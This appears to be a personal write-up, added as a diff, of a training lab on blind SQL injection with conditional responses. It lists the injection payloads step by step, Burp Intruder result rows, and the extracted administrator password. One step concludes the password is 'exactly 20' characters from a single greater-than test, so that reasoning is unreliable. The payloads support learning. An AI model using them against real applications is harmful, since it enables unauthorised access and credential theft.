@@ -1,0 +1,63 @@
+Lab: Blind SQL injection with conditional responses
+
+The results of the SQL query are not returned, and no error messages are displayed. But the application includes a Welcome back message in the page if the query returns any rows. 
+
+
+The database contains a different table called users,
+with columns called username and password
+
+To solve the lab, log in as the administrator user.
+
+Analysis:
+
+1) Confirm that the parameter is vulnerable to blind SQLi
+
+select tracking-id from tracking-table where trackingId = 'n7kHsi1czthrAvsG'
+
+-> If this tracking id exists -> query returns value -> Welcome back message
+-> If the tracking id doesn't exist -> query returns nothing -> no Welcome back message
+
+' and 1=1--'
+-> TRUE -> Welcome back
+
+' and 1=0--'
+-> FALSE -> no Welcome back
+
+2) Confirm that we have a users table
+
+' and (select 'x' from users LIMIT 1)='x'--'
+-> users table exists in the database.
+
+3) Confirm that username administrator exists users table
+
+' and (select username from users where username='administrator')='administrator'--'
+-> administrator user exists
+
+4) Enumerate the password of the administrator user
+
+' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--'
+-> password is exactly 20 characters
+
+5) Brute Force to get the password
+
+' and (select substring(password,1,1) from users where username='administrator') = 'a'--'
+
+17	q	200	48	false	false	11547	 different so its q 
+18	r	200	60	false	false	11486	
+19	s	200	172	false	false	11486	
+20	t	200	51	false	false	11486	
+21	u	200	54	false	false	11486	
+22	v	200	50	false	false	11486	
+23	w	200	49	false	false	11486	
+
+
+Cluster bomb
+1st payload 1 digit we prove Number 1 to 20
+2nd payload 'a' 
+
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
+q t s l 1 d s 7 b v  p  i  u  l  u  1  w  i  0  z
+
+
+         
+qtsl1ds7bvpiulu1wi0z
